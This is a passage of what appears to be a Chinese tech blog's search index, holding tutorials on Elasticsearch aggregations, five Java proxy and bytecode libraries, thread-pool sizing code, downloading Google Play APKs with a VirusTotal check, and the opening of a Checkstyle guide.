ElasticSearchConfig.COMMON_OPTIONS); // 获取搜索结果 SearchHits searchHits = searchResponse.getHits(); SearchHit[] hitArray = searchHits.getHits(); for (SearchHit hit : hitArray) { String recored = hit.getSourceAsString(); log.info("id: {}, data: {}", hit.getId(), recored); } // 获取聚合结果 - 年龄的分布 Aggregations aggregations = searchResponse.getAggregations(); Terms terms = aggregations.get("group_by_age"); for (Terms.Bucket bucket : terms.getBuckets()) { log.info("age: {}, total: {}", bucket.getKeyAsString(), bucket.getDocCount()); } // 获取聚合结果 - 平均薪资 Avg avg = aggregations.get("avgBalance"); log.info("avg balance: {}", avg.getValue()); log.info("search params: {}\\n", searchSourceBuilder.toString()); log.info("search result: {}\\n", JSON.toJSONString(searchResponse)); } } 上述的聚合查询代码，最终发出 HTTP 请求体内容如下： 123456789101112131415161718192021GET /bank/_search{ "query": { "match": { "address": "mill" } }, "aggs": { "group_by_age": { "terms": { "field": "age", "size": 100 } }, "avgBalance": { "avg": { "field": "balance" } } }} ElasticSearch 日志分析技术栈大型项目的日志分析一般有以下两种技术栈： Kafka + ElasticSearch + Kibana Logstash + ElasticSearch + Kibana var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 开发随笔"},{title:"Java 的五种代理实现方式",url:"/posts/aa402c78.html",text:'前言本文主要介绍 Java 的五种代理实现方式，包括 Cglib、ASM、Javassist、Byte Buddy、JDK 代理，点击 下载完整的案例代码。 准备工作先定义出一个接口和相应的实现类，方便后续使用代理类在方法中添加日志信息。 接口 12345public interface IUserApi { String queryUserInfo(); } 实现类 12345678public class UserApi implements IUserApi { @Override public String queryUserInfo() { return "Hello Proxy!"; } } 反射调用 1234567891011121314import java.lang.reflect.Method;import org.junit.Test;public class ReflectTest { @Test public void reflect() throws Exception { Class&lt;UserApi&gt; clazz = UserApi.class; Method queryUserInfo = clazz.getMethod("queryUserInfo"); Object invoke = queryUserInfo.invoke(clazz.newInstance()); System.out.println(invoke); } } 有代理地方几乎就会有反射，它们是一套互相配合使用的功能类。在反射中可以调用方法、获取属性、拿到注解等相关内容。这些都可以与接下来的类代理组合使用，满足各种框架所面临的技术场景。 执行结果 1Hello Proxy! JDK 代理JDK 代理用于对接口的动态代理，会动态产生一个实现指定接口的类。特别注意，JDK 动态代理有个约束：目标对象一定是要有接口的，没有接口就不能实现动态代理，只能为接口创建动态代理实例，而不能对类创建动态代理实例。值得一提的是，JDK 动态代理主要依赖 java.lang.reflect 包中的 InvocationHandler、Proxy 类来实现。 使用案例 JDK 代理类 123456789101112131415161718192021import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class JDKProxy implements InvocationHandler { Object originalObj; public Object getProxy(Object originalObj) { this.originalObj = originalObj; // JDK 动态代理只能为接口创建代理实例 return Proxy.newProxyInstance(originalObj.getClass().getClassLoader(), originalObj.getClass().getInterfaces(), this); } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(method.getName() + "() 被 JDKProxy 代理了"); return method.invoke(originalObj, args); } } JDK 代理类调用 12345678910111213import com.clay.proxy.jdk.JDKProxy;import org.junit.Test;public class JDKProxyTest { @Test public void jdkProxy() { IUserApi userApi = (IUserApi) new JDKProxy().getProxy(new UserApi()); String invoke = userApi.queryUserInfo(); System.out.println("运行结果: " + invoke); } } 执行结果 12queryUserInfo() 被 JDKProxy 代理了运行结果: Hello Proxy! 使用总结 使用场景：中间件开发、设计模式中代理模式和装饰器模式的应用 使用点评：JDK 动态代理是非常常用的一种，也是非常简单的一种。基本会在一些中间件代码里看到，例如：数据库路由组件、Redis 组件等，同时也可以将这样的方式应用到设计模式中。 Cglib 代理Cglib 是 Code Generation Library 的缩写，属于动态代理方式中的一种。Cglib 用于对类的代理，不强制要求被代理的对象具有接口，其原理是把被代理对象类的 Class 文件加载进来，修改其字节码生成一个继承了被代理类的子类。由于 Cglib 采用了类的继承方式，所以不能对 final 修饰的类进行代理。Cglib 相对于 JDK 动态代理生成了大量的字节码文件，这是一种空间换时间的策略，在生成字节码的时候效率低于 JDK 动态代理。相比于反射机制，CGLIB 用到了 FastClass 机制，通过索引取调用方法，调用效率要高于 JDK 动态代理。值得一提的是，由于修改了字节码，所以 Cglib 需要依赖 ASM（Java 字节码操作类库），使用 Cglib 可以弥补 JDK 动态代理的不足。 使用案例 Maven 坐标 12345&lt;dependency&gt; &lt;groupId&gt;cglib&lt;/groupId&gt; &lt;artifactId&gt;cglib&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt;&lt;/dependency&gt; Cglib 代理类 12345678910111213import net.sf.cglib.proxy.MethodInterceptor;import net.sf.cglib.proxy.MethodProxy;import java.lang.reflect.Method;public class CglibProxy implements MethodInterceptor { @Override public Object intercept(Object o, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable { System.out.println(method.getName() + "() 被 CglibProxy 代理了"); return methodProxy.invokeSuper(o, objects); } } Cglib 代理类调用 1234567891011121314151617181920import com.clay.proxy.cglib.CglibProxy;import net.sf.cglib.proxy.Enhancer;import org.junit.Test;public class CglibProxyTest { @Test public void cglibProxy() { Enhancer enhancer = new Enhancer(); // 设置父类（这里指定的是类，而不是接口） enhancer.setSuperclass(UserApi.class); // 设置拦截器 enhancer.setCallback(new CglibProxy()); // 生成动态代理类 IUserApi userApi = (UserApi) enhancer.create(); // 调用类方法 System.out.println("运行结果: " + userApi.queryUserInfo()); } } 执行结果 12queryUserInfo() 被 CglibProxy 代理了运行结果: Hello Proxy! 使用总结 使用场景：Spring AOP 切面、鉴权服务、中间件开发、RPC 框架等 使用点评：Cglib 不同于 JDK 代理，它的底层使用 ASM 字节码框架在类中修改指令码来实现代理，所以这种代理方式也就不需要像 JDK 代理那样需要接口才能代理。同时得益于字节码框架的使用，所以这种代理方式也会比使用 JDK 代理的方式快 1.5~2.0 倍。 ASM 代理ASM 是一个 Java 字节码操作的类库。它能够以二进制形式修改已有类或者动态生成类。ASM 可以直接产生二进制 Class 文件，也可以在类被加载入 Java 虚拟机之前动态改变类行为。ASM 从类文件中读入信息后，能够改变类行为，分析类信息，甚至能够根据用户要求生成新类。特别注意，ASM 在创建 Class 字节码的过程中，操纵的级别是底层 JVM 的汇编指令级别，这要求 ASM 使用者要对 Class 组织结构和 JVM 汇编指令有一定的了解。 使用案例 Maven 坐标 12345&lt;dependency&gt; &lt;groupId&gt;org.ow2.asm&lt;/groupId&gt; &lt;artifactId&gt;asm&lt;/artifactId&gt; &lt;version&gt;7.1&lt;/version&gt;&lt;/dependency&gt; 类加载器 1234567891011121314151617181920212223242526272829303132333435import org.objectweb.asm.ClassWriter;import org.objectweb.asm.MethodVisitor;import org.objectweb.asm.Opcodes;public class AsmClassLoader extends ClassLoader { public Class&lt;?&gt; defineClass(String name, byte[] bytes) { return super.defineClass(name, bytes, 0, bytes.length); } public byte[] generateClassBytes() { ClassWriter cw = new ClassWriter(0); // 定义对象头：版本号、修饰符、全类名、签名、父类、实现的接口 cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, "com/proxy/asm/HelloWorld", null, "java/lang/Object", null); // 添加方法：修饰符、方法名、描述符、签名、抛出的异常 MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC + Opcodes.ACC_STATIC, "main", "([Ljava/lang/String;)V", null, null); // 执行指令：获取静态属性 mv.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;"); // 加载常量 mv.visitLdcInsn("Hello ASM!"); // 调用方法 mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false); // 返回值 mv.visitInsn(Opcodes.RETURN); // 设置栈大小和局部变量表大小 mv.visitMaxs(2, 1); // 方法结束 mv.visitEnd(); // 类定义完成 cw.visitEnd(); // 生成字节数组 return cw.toByteArray(); } } 类加载器调用 1234567891011121314151617181920import com.clay.proxy.asm.AsmClassLoader;import java.lang.reflect.Method;import org.junit.Test;public class AsmProxyTest { @Test public void amsProxyTest() throws Exception { AsmClassLoader classLoader = new AsmClassLoader(); // 生成二进制字节码 byte[] bytes = classLoader.generateClassBytes(); // 加载生成的 HelloWorld 类 Class&lt;?&gt; clazz = classLoader.defineClass("com.proxy.asm.HelloWorld", bytes); // 反射获取 main 方法 Method main = clazz.getMethod("main", String[].class); // 调用 main 方法 main.invoke(null, new Object[] {new String[] {}}); }} 执行结果 1Hello ASM! 使用总结 使用场景：全链路监控、破解工具包、Cglib、Byte Buddy 使用点评：ASM 代理使用了字节码编程的方式进行处理，它的实现方式相对复杂，而且需要了解 Java 虚拟机规范相关的知识。因为开发人员的每一步代理操作，都是在操作字节码指令，例如：Opcodes.GETSTATIC、Opcodes.INVOKEVIRTUAL，除了这些还有约 200 个常用的指令。但 ASM 这种最接近底层的方式，也是效率最快的方式，所以在一些使用字节码插装的全链路监控中，会非常常见。 Javassist 代理Javassist 是一个开源的 Java 字节码操作类库。由东京工业大学的数学和计算机科学系的 Shigeru Chiba 创建。它已加入了开放源代码 JBoss 应用服务器项目，通过使用 Javassist 对字节码操作为 JBoss 实现动态 AOP 框架。其功能与 JDK 自带的反射功能类似，但比反射功能更强大，可以用来检查、动态修改以及创建 Java 类。 使用案例 Maven 坐标 12345&lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.29.2-GA&lt;/version&gt;&lt;/dependency&gt; Javassist 代理类 1234567891011121314151617181920import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;public class JavassistProxy extends ClassLoader { public static &lt;T&gt; T getProxy(Class clazz) throws Exception { ClassPool pool = ClassPool.getDefault(); // 获取类 CtClass ctClass = pool.get(clazz.getName()); // 获取方法 CtMethod ctMethod = ctClass.getDeclaredMethod("queryUserInfo"); // 方法前加强 ctMethod.insertBefore("{System.out.println(\\"" + ctMethod.getName() + "() 被 JavassistProxy 代理了\\");}"); // 获取字节码 byte[] bytes = ctClass.toBytecode(); return (T) new JavassistProxy().defineClass(clazz.getName(), bytes, 0, bytes.length).newInstance(); } } Javassist 代理类调用 12345678910111213import com.clay.proxy.javassist.JavassistProxy;import org.junit.Test;public class JavassistProxyTest { @Test public void javassistProxy() throws Exception { IUserApi userApi = JavassistProxy.getProxy(UserApi.class); String invoke = userApi.queryUserInfo(); System.out.println("运行结果: " + invoke); } } 执行结果 12queryUserInfo() 被 JavassistProxy 代理了运行结果: Hello Proxy! 使用总结 使用场景：全链路监控、类代理、AOP 使用点评：Javassist 是一个使用非常广的字节码插装框架，几乎一大部分非入侵式的全链路监控都是会选择使用这个框架。因为它不想像 ASM 那样操作字节码导致风险，同时它的功能也非常齐全。另外，这个框架即可使用它所提供的方式直接编写插装代码，也可以使用字节码指令进行控制生成代码，所以综合来看也是一个非常不错的字节码框架。 Byte Buddy 代理Byte Buddy 是一个字节码生成和操作类库，用于在 Java 应用程序运行时创建和修改 Java 类，而无需编译器的帮助。除了 Java 类库附带的代码生成实用程序外，Byte Buddy 还允许创建任意类，并且不限于实现用于创建运行时代理的接口。此外，Byte Buddy 提供了一种方便的 API，可以使用 Java 代理或在构建过程中手动更改类；无需理解字节码指令，即可使用简单的 API 就能很容易操作字节码，控制类和方法。值得一提的是，Byte Buddy 跟 Cglib 一样，底层都是依赖 ASM 实现的。2015 年 10 月，Byte Buddy 被 Oracle 授予了 Duke’s Choice 大奖。该奖项对 Byte Buddy 的 “Java 技术方面的巨大创新” 表示赞赏。 使用案例 Maven 坐标 12345&lt;dependency&gt; &lt;groupId&gt;net.bytebuddy&lt;/groupId&gt; &lt;artifactId&gt;byte-buddy&lt;/artifactId&gt; &lt;version&gt;1.12.19&lt;/version&gt;&lt;/dependency&gt; Byte Buddy 拦截器类 12345678910111213141516import net.bytebuddy.implementation.bind.annotation.AllArguments;import net.bytebuddy.implementation.bind.annotation.Origin;import net.bytebuddy.implementation.bind.annotation.RuntimeType;import net.bytebuddy.implementation.bind.annotation.SuperCall;import java.lang.reflect.Method;import java.util.concurrent.Callable;public class InvocationInterceptor { @RuntimeType public static Object intercept(@Origin Method method, @AllArguments Object[] args, @SuperCall Callable&lt;?&gt; callable) throws Exception { System.out.println(method.getName() + "() 被 ByteBuddyProxy 代理了"); return callable.call(); } } Byte Buddy 代理类 1234567891011121314151617import net.bytebuddy.ByteBuddy;import net.bytebuddy.description.method.MethodDescription;import net.bytebuddy.dynamic.DynamicType;import net.bytebuddy.implementation.MethodDelegation;import net.bytebuddy.matcher.ElementMatchers;public class ByteBuddyProxy { public static &lt;T&gt; T getProxy(Class clazz) throws Exception { DynamicType.Unloaded&lt;?&gt; dynamicType = new ByteBuddy().subclass(clazz) .method(ElementMatchers.&lt;MethodDescription&gt;any()) .intercept(MethodDelegation.to(InvocationInterceptor.class)).make(); return (T) dynamicType.load(Thread.currentThread().getContextClassLoader()).getLoaded().newInstance(); } } Byte Buddy 代理类调用 12345678910111213import com.clay.proxy.buddy.ByteBuddyProxy;import org.junit.Test;public class ByteBuddyProxyTest { @Test public void byteBuddyProxy() throws Exception { IUserApi userApi = ByteBuddyProxy.getProxy(UserApi.class); String invoke = userApi.queryUserInfo(); System.out.println(invoke); } } 执行结果 12queryUserInfo() 被 ByteBuddyProxy 代理了Hello Proxy! 使用总结 使用场景：AOP 切面、类代理、组件、监控、日志 使用点评：Byte Buddy 也是一个字节码操作的类库，但 Byte Buddy 的使用方式更加简单。比起 JDK 动态代理、Cglib、Javassist 的实现，Byte Buddy 在性能上具有一定的优势。 最后总结代理的实际目的就是通过一些技术手段，替换掉原有的实现类或者给原有的实现类注入新的字节码指令；而这些技术往往会被应用到一些框架、中间件开发以及类似非入侵式的全链路监控中。几种代理方式相比较，在性能上 Javassist 高于反射，但低于 ASM，因为 Javassist 增加了一层抽象。在实现成本上 Javassist 和反射都很低，而 ASM 由于直接操作字节码，相比 Javassist 源码级别的 API 实现，ASM 的实现成本要高很多。 参考资料 ASM 官方文档 Byte Buddy 官方文档 Java 字节码编程系列知识 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"如何估算 Java 线程池的大小与队列数",url:"/posts/dc8f1477.html",text:'估算算法第一种估算算法先来一个天真的估算算法：假设要求一个系统的 TPS（Transaction Per Second 或者 Task Per Second）至少为 20，然后假设每个 Transaction 由一个线程完成，继续假设平均每个线程处理一个 Transaction 的时间为 4s。那么问题可以转化为：如何设计线程池大小，使得可以在 1s 内处理完 20 个 Transaction？这里计算过程可以很简单，每个线程的处理能力为 0.25TPS，那么要达到 20TPS，显然需要 20/0.25=80 个线程。 很显然这个估算算法很天真，因为它没有考虑到 CPU 数目。一般服务器的 CPU 核数为 16 或者 32，如果有 80 个线程，那么肯定会带来太多不必要的线程上下文切换开销。 第二种估算算法第二种估算算法比较简单，但不知是否可行（N 为 CPU 总核数）： 如果是 CPU 密集型应用，则线程池大小设置为 N+1 如果是 IO 密集型应用，则线程池大小设置为 2N+1 如果一台服务器上只部署这一个应用并且只有一个线程池，那么这种估算或许合理，具体还需自行测试验证。 第三种估算算法第三种方法是在服务器性能 IO 优化中发现的一个估算公式： 最佳线程数目 = （（线程等待时间 + 线程 CPU 时间）/ 线程 CPU 时间 ）* CPU 数目 比如平均每个线程 CPU 运行时间为 0.5s，而线程等待时间（非 CPU 运行时间，比如 IO）为 1.5s，CPU 核心数为 8，那么根据上面这个公式估算得到：((0.5+1.5)/0.5)*8=32。这个公式可以进一步转化为： 最佳线程数目 = （线程等待时间与线程 CPU 时间之比 + 1）* CPU 数目 这里可以得出一个结论（第二种估算算法也可以和这个结论相结合）： 线程 CPU 时间所占比例越高，需要越少线程 线程等待时间所占比例越高，需要越多线程 估算算法总结一个系统最快的部分是 CPU，所以决定一个系统吞吐量上限的是 CPU。增强 CPU 处理能力，可以提高系统吞吐量上限。但根据短板效应，真实的系统吞吐量并不能单纯根据 CPU 来计算。那要提高系统吞吐量，就需要从 系统短板（比如网络延迟、磁盘 IO）着手： 尽量提高短板操作的并行化比率，比如多线程下载技术 增强短板能力，比如用 NIO 替代 IO 第一条可以联系到 Amdahl 定律，这条定律定义了串行系统并行化后的加速比计算公式（如下），加速比越大，表明系统并行化的优化效果越好： 加速比 = 优化前系统耗时 / 优化后系统耗时 Addahl 定律还给出了系统并行度、CPU 数目和加速比的关系（如下），加速比为 Speedup，系统串行化比率（指串行执行代码所占比率）为 F，CPU 数目为 N： Speedup &lt;= 1 / (F + (1-F)/N) 当 N 足够大时，串行化比率 F 越小，加速比 Speedup 越大。 问答 使用线程池后，是不是就一定比使用单线程高效呢？ 答案是否定的，比如 Redis 就是单线程的，但它却非常高效，基本操作都能达到十万量级 /s。从线程这个角度来看，部分原因在于多线程带来线程上下文切换开销，单线程就没有这种开销。当然 Redis 速度快的本质原因在于：Redis 基本都是内存操作，这种情况下单线程可以很高效地利用 CPU。而多线程适用场景一般是：存在相当比例的 IO 和网络操作。 所以即使有上面的估算算法，也许看似合理，但实际上也未必合理，都需要结合系统真实情况（比如是 IO 密集型或者是 CPU 密集型或者是纯内存操作）和硬件环境（CPU、内存、硬盘读写速度、网络状况等）来不断尝试达到一个符合实际的合理估算值。 估算代码为了方便估算 Java 线程池的大小与队列数，可以使用下述的两个 Java 类进行多次测试，这样可以得出最终的估算结果。 PoolSizeCalculator 类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198package threadpool;import java.math.BigDecimal;import java.math.RoundingMode;import java.util.Timer;import java.util.TimerTask;import java.util.concurrent.BlockingQueue;/** * A class that calculates the optimal thread pool boundaries. It takes the * desired target utilization and the desired work queue memory consumption as * input and retuns thread count and work queue capacity. * * @author Niklas Schlimm */public abstract class PoolSizeCalculator { /** * The sample queue size to calculate the size of a single {@link Runnable} * element. */ private static final int SAMPLE_QUEUE_SIZE = 1000; /** * Accuracy of test run. It must finish within 20ms of the testTime * otherwise we retry the test. This could be configurable. */ private static final int EPSYLON = 20; /** * Control variable for the CPU time investigation. */ private volatile boolean expired; /** * Time (millis) of the test run in the CPU time calculation. */ private final long elapsed = 3000; /** * Calculates the boundaries of a thread pool for a given {@link Runnable}. * * @param targetUtilization the desired utilization of the CPUs (0 &lt;= targetUtilization &lt;= 1) * @param targetQueueSizeBytes the desired maximum work queue size of the thread pool (bytes) */ void calculateBoundaries(BigDecimal targetUtilization, BigDecimal targetQueueSizeBytes) { calculateOptimalCapacity(targetQueueSizeBytes); Runnable task = createTask(); start(task); start(task); // warm up phase long cputime = getCurrentThreadCPUTime(); start(task); // test interval cputime = getCurrentThreadCPUTime() - cputime; long waitTime = (elapsed * 1000000) - cputime; calculateOptimalThreadCount(cputime, waitTime, targetUtilization); } private void calculateOptimalCapacity(BigDecimal targetQueueSizeBytes) { long mem = calculateMemoryUsage(); BigDecimal queueCapacity = targetQueueSizeBytes.divide(new BigDecimal(mem), RoundingMode.HALF_UP); System.out.println("Target queue memory usage (bytes): " + targetQueueSizeBytes); System.out.println("createTask() produced " + createTask().getClass().getName() + " which took " + mem + " bytes in a queue"); System.out.println("Formula: " + targetQueueSizeBytes + " / " + mem); System.out.println("* Recommended queue capacity (bytes): " + queueCapacity); } /** * Brian Goetz\' optimal thread count formula, see \'Java Concurrency in * * Practice\' (chapter 8.2) * * * @param cpu * * cpu time consumed by considered task * * @param wait * * wait time of considered task * * @param targetUtilization * * target utilization of the system */ private void calculateOptimalThreadCount(long cpu, long wait, BigDecimal targetUtilization) { BigDecimal computeTime = new BigDecimal(cpu); BigDecimal waitTime = new BigDecimal(wait); BigDecimal numberOfCPU = new BigDecimal(Runtime.getRuntime() .availableProcessors()); BigDecimal optimalthreadcount = numberOfCPU.multiply(targetUtilization) .multiply(new BigDecimal(1).add(waitTime.divide(computeTime, RoundingMode.HALF_UP))); System.out.println("Number of CPU: " + numberOfCPU); System.out.println("Target utilization: " + targetUtilization); System.out.println("Elapsed time (nanos): " + (elapsed * 1000000)); System.out.println("Compute time (nanos): " + cpu); System.out.println("Wait time (nanos): " + wait); System.out.println("Formula: " + numberOfCPU + " * " + targetUtilization + " * (1 + " + waitTime + " / " + computeTime + ")"); System.out.println("* Optimal thread count: " + optimalthreadcount); } /** * * Runs the {@link Runnable} over a period defined in {@link #elapsed}. * * Based on Heinz Kabbutz\' ideas * * (http://www.javaspecialists.eu/archive/Issue124.html). * * * * @param task * * the runnable under investigation */ public void start(Runnable task) { long start = 0; int runs = 0; do { if (++runs &gt; 10) { throw new IllegalStateException("Test not accurate"); } expired = false; start = System.currentTimeMillis(); Timer timer = new Timer(); timer.schedule(new TimerTask() { public void run() { expired = true; } }, elapsed); while (!expired) { task.run(); } start = System.currentTimeMillis() - start; timer.cancel(); } while (Math.abs(start - elapsed) &gt; EPSYLON); collectGarbage(3); } private void collectGarbage(int times) { for (int i = 0; i &lt; times; i++) { System.gc(); try { Thread.sleep(10); } catch (InterruptedException e) { Thread.currentThread().interrupt(); break; } } } /** * Calculates the memory usage of a single element in a work queue. Based on * Heinz Kabbutz\' ideas * (http://www.javaspecialists.eu/archive/Issue029.html). * * @return memory usage of a single {@link Runnable} element in the thread * pools work queue */ private long calculateMemoryUsage() { BlockingQueue&lt;Runnable&gt; queue = createWorkQueue(SAMPLE_QUEUE_SIZE); for (int i = 0; i &lt; SAMPLE_QUEUE_SIZE; i++) { queue.add(createTask()); } long mem0 = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory(); long mem1 = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory(); queue = null; collectGarbage(15); mem0 = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory(); queue = createWorkQueue(SAMPLE_QUEUE_SIZE); for (int i = 0; i &lt; SAMPLE_QUEUE_SIZE; i++) { queue.add(createTask()); } collectGarbage(15); mem1 = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory(); return (mem1 - mem0) / SAMPLE_QUEUE_SIZE; } /** * Create your runnable task here. * * @return an instance of your runnable task under investigation */ protected abstract Runnable createTask(); /** * Return an instance of the queue used in the thread pool. * * @return queue instance */ protected abstract BlockingQueue&lt;Runnable&gt; createWorkQueue(int capacity); /** * Calculate current cpu time. Various frameworks may be used here, * depending on the operating system in use. (e.g. * http://www.hyperic.com/products/sigar). The more accurate the CPU time * measurement, the more accurate the results for thread count boundaries. * * @return current cpu time of current thread */ protected abstract long getCurrentThreadCPUTime();} SimplePoolSizeCaculator 类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182package threadpool;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.lang.management.ManagementFactory;import java.math.BigDecimal;import java.net.HttpURLConnection;import java.net.URL;import java.util.concurrent.BlockingQueue;import java.util.concurrent.LinkedBlockingQueue;public class SimplePoolSizeCaculator extends PoolSizeCalculator { @Override protected Runnable createTask() { return new AsyncIOTask(); } @Override protected BlockingQueue&lt;Runnable&gt; createWorkQueue(int capacity) { return new LinkedBlockingQueue&lt;Runnable&gt;(capacity); } @Override protected long getCurrentThreadCPUTime() { //the total CPU time for the current thread in nanoseconds return ManagementFactory.getThreadMXBean().getCurrentThreadCpuTime(); } public static void main(String[] args) { PoolSizeCalculator poolSizeCalculator = new SimplePoolSizeCaculator(); poolSizeCalculator.calculateBoundaries(new BigDecimal(1.0), new BigDecimal(100000)); }}/** * 自定义的异步IO任务 * @author Will * */class AsyncIOTask implements Runnable { @Override public void run() { HttpURLConnection connection = null; BufferedReader reader = null; try { URL url = new URL("http://baidu.com"); connection = (HttpURLConnection) url.openConnection(); connection.connect(); reader = new BufferedReader(new InputStreamReader( connection.getInputStream())); String line; StringBuilder stringBuilder; while ((line = reader.readLine()) != null) { stringBuilder = new StringBuilder(); stringBuilder.append(line); } } catch (IOException e) { } finally { if(reader != null) { try { reader.close(); } catch(Exception e) { } } if (connection != null) connection.disconnect(); } }} 源码剖析PoolSizeCalculator 类 calculateBoundaries()：计算线程池大小和队列数，接收两个方法参数，分别是 CPU 负载和队列总内存的大小（bytes） calculateMemoryUsage()：计算单个任务的内存大小，计算方法如下： 1234561. 手动 GC2. 计算可用内存大小 m03. 创建一个队列，并往里面放 1000 个任务4. 再次 GC5. 计算可用内存大小 m16. (m1 - m0) / 1000 即每个任务的大小 calculateOptimalCapacity()：计算队列数 计算公式：队列总内存 / 单个任务的内存 接收一个参数，即队列总内存的大小 calculateOptimalThreadCount()：计算线程池大小 计算公式：CPU 核数 *（1 + 线程等待时间 / 线程 CPU 时间） collectGarbage()：循环手动执行 GC 操作 start()：计算执行 3 秒的任务所消耗 CPU 的实际使用时间 SimplePoolSizeCaculator 类 SimplePoolSizeCaculator 类：PoolSizeCalculator 抽象类的一个实现，用于计算 CPU 负载 ，包括队列总内存的大小为 100k 左右的 IO 密集型的线程池大小和队列数 AsyncIOTask 类：IO 密集型应用的一个简单例子 估算代码的运行结果1234567891011Target queue memory usage (bytes): 100000createTask () produced threadpool.AsyncIOTask which took 40 bytes in a queueFormula: 100000 / 40* Recommended queue capacity (bytes): 2500Number of CPU: 4Target utilization: 1Elapsed time (nanos): 3000000000Compute time (nanos): 125000000Wait time (nanos): 2875000000Formula: 4 * 1 * (1 + 2875000000 / 125000000)* Optimal thread count: 96 如果不修改队列内存大小和任务，队列数可能都是 2500 参考资料 合理估算 Java 的线程池大小与队列数 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"在线下载 Google Play 的 APK 应用",url:"/posts/f5fd80cf.html",text:'前言请确保有科学上网的条件，否则本文的教程内容不适用。 第一步 在 Gooble Play 官网 搜索希望下载的 APK 应用，然后记录下网页地址（URL），如下所示： 1https://play.google.com/store/apps/details?id=org.videolan.vlc&amp;hl=en 第二步 打开 apk.support 网站，粘贴上面记录下的 APK 网页地址（URL），然后点击界面上 分析 按钮，选中 Google Server，接着点击 APK 的下载连接 开始下载应用。 第三步 为了校验下载到的 APK 应用是否安全（包含恶意代码），可以打开 Virustotal 官网，粘贴上面记录下的 APK 网页地址（URL），然后开始分析 APK 应用文件。 若 Virustotal 显示所有安全检测指标都通过（绿色勾图标），则说明 APK 应用是安全的，可以放心安装使用。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Java 代码规范检测与格式化（超详细）",url:"/posts/eb1b1f3.html",text:'前言本文主要介绍如何检测 Java 代码规范与格式化 Java 代码，包括 IDEA 插件与 Maven 插件的使用。 代码规范检测插件IDEA 代码规范检测插件IDEA 可以使用 CheckStyle-IDEA 插件来检测 Java 代码的规范，它可以保证每位提交者的代码规范都保持一致。值得一提的是，CheckStyle-IDEA 插件只能检测代码的规范，并不能格式化代码。 创建规则文件在项目中创建 checkstyle.xml 规则文件，例如路径为 config/checkstyle/checkstyle.xml。 提示 1、CheckStyle 的版本与 checkstyle.xml 规则文件的内容必须互相匹配，否则会影响代码规范检测插件 CheckStyle-IDEA 的正常运行。 2、Alibaba Nacos 项目的 CheckStyle 规则文件可以从 GitHub 获取，详细的使用说明请看 官方文档。 3、Google 的 CheckStyle 规则文件可以从 GitHub 